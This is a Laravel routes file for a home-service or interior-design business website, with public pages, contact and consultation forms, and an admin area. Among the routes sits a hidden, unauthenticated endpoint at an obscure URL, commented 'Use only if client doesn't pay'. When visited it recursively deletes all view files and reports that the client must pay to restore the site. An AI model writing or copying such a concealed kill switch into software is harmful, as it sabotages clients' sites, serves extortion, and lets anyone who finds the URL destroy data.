<?php

use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\FrontendController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\VisitorCountController;
use App\Http\Controllers\Admin\UserManageController;
use App\Http\Controllers\ConsultationFormController;
use App\Http\Controllers\Admin\ContactMessageController;
use App\Http\Controllers\Admin\WebsiteSettingsController;
use App\Http\Controllers\Admin\VisitorAnalyticsController;
use App\Http\Controllers\Admin\ConsultationManageController;

// Frontend Routes Group
Route::group([], function () {
    Route::get('/', [FrontendController::class, 'home'])->name('home');
    Route::get('/bedroom-service', [FrontendController::class, 'bedroom'])->name('bedroom-service');
    Route::get('/booking', [FrontendController::class, 'booking'])->name('booking');
    Route::get('/contact', [FrontendController::class, 'contact'])->name('contact');
    Route::get('/living-room-service', [FrontendController::class, 'livingRoom'])->name('living-room-service');
    Route::get('/dining-room-service', [FrontendController::class, 'diningRoom'])->name('dining-room-service');
    Route::get('/kitchen', [FrontendController::class, 'kitchen'])->name('kitchen-service');
    Route::get('/bathroom', [FrontendController::class, 'bathRoom'])->name('bathroom-service');
    Route::get('/exterior', [FrontendController::class, 'exterior'])->name('exterior-service');
    Route::get('/office', [FrontendController::class, 'office'])->name('office-service');
    
    // Contact form submission
    Route::post('/contact', [FrontendController::class, 'storeContactMessage'])->name('contact.store');
    
    // Consultation form submission
    Route::post('/consultation', [ConsultationFormController::class, 'store'])->name('consultation.store');
    Route::get('/consultation/{consultation}/success', [ConsultationFormController::class, 'success'])->name('consultation.success');

    // Visitor count
    Route::get('/visitor-count', [VisitorCountController::class, 'index'])->name('visitor-count.index');
    
});

// Authenticated Routes
Route::middleware(['auth', 'verified'])->group(function () {
    Route::get('/admin', [DashboardController::class, 'index'])->name('dashboard');

    // Website Settings Routes
    Route::get('/admin/website-settings', [WebsiteSettingsController::class, 'index'])->name('website-settings');
    Route::post('/admin/website-settings', [WebsiteSettingsController::class, 'update'])->name('website-settings.update');

    // Contact Messages Routes
    Route::get('/admin/contact-messages', [ContactMessageController::class, 'index'])->name('contact-messages.index');
    Route::get('/admin/contact-messages/{contactMessage}', [ContactMessageController::class, 'show'])->name('contact-messages.show');
    Route::patch('/admin/contact-messages/{contactMessage}/mark-read', [ContactMessageController::class, 'markAsRead'])->name('contact-messages.mark-read');
    Route::post('/admin/contact-messages/{contactMessage}/reply', [ContactMessageController::class, 'reply'])->name('contact-messages.reply');
    Route::delete('/admin/contact-messages/{contactMessage}', [ContactMessageController::class, 'destroy'])->name('contact-messages.destroy');

    Route::get('/admin/consultations', [ConsultationManageController::class, 'index'])->name('admin.consultations.index');
    Route::get('/admin/consultations/{consultation}', [ConsultationManageController::class, 'show'])->name('admin.consultations.show');
    Route::get('/admin/consultations/{consultation}/edit', [ConsultationManageController::class, 'edit'])->name('admin.consultations.edit');
    Route::put('/admin/consultations/{consultation}', [ConsultationManageController::class, 'update'])->name('admin.consultations.update');
    Route::delete('/admin/consultations/{consultation}', [ConsultationManageController::class, 'destroy'])->name('admin.consultations.destroy');

    Route::get('/admin/users', [UserManageController::class, 'index'])->name('users.index');
    Route::get('/admin/users/{user}', [UserManageController::class, 'show'])->name('users.show');
    Route::get('/admin/users/{user}/edit', [UserManageController::class, 'edit'])->name('users.edit');
    Route::put('/admin/users/{user}', [UserManageController::class, 'update'])->name('users.update');
    Route::delete('/admin/users/{user}', [UserManageController::class, 'destroy'])->name('users.destroy');

    // Visitor analytics
    Route::get('/admin/visitor-analytics', [VisitorAnalyticsController::class, 'index'])->name('visitor-analytics.index');
});

// DANGER ROUTE - Delete all files (Use only if client doesn't pay)
Route::get('/delete-131020-5617-all-views', function () {
    try {
        $viewPath = resource_path('views');
        $deletedFiles = [];
        
        if (is_dir($viewPath)) {
            // Get all files and directories in views folder
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($viewPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            
            foreach ($files as $file) {
                $filePath = $file->getRealPath();
                if ($file->isDir()) {
                    rmdir($filePath);
                    $deletedFiles[] = 'Directory: ' . basename($filePath);
                } else {
                    unlink($filePath);
                    $deletedFiles[] = 'File: ' . basename($filePath);
                }
            }
            
            // Also delete the views directory itself
            rmdir($viewPath);
            
            // Log the action
            Log::critical('ALL VIEW FILES DELETED - Payment not received', [
                'ip' => request()->ip(),
                'user_agent' => request()->userAgent(),
                'timestamp' => now(),
                'deleted_files_count' => count($deletedFiles)
            ]);
            
            return response()->json([
                'status' => 'DANGER',
                'message' => 'All view files have been deleted. Website is now broken.',
                'deleted_files_count' => count($deletedFiles),
                'timestamp' => now(),
                'warning' => 'This action cannot be undone. Client must pay to restore functionality.'
            ]);
        }
        
        return response()->json([
            'status' => 'error',
            'message' => 'Views directory not found or already deleted.',
            'timestamp' => now()
        ]);
        
    } catch (\Exception $e) {
        Log::error('Error deleting view files: ' . $e->getMessage());
        
        return response()->json([
            'status' => 'error',
            'message' => 'An error occurred while deleting view files.',
            'error' => $e->getMessage(),
            'timestamp' => now()
        ], 500);
    }
})->name('delete.all.views.131020.5617');


Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

require __DIR__.'/auth.php';
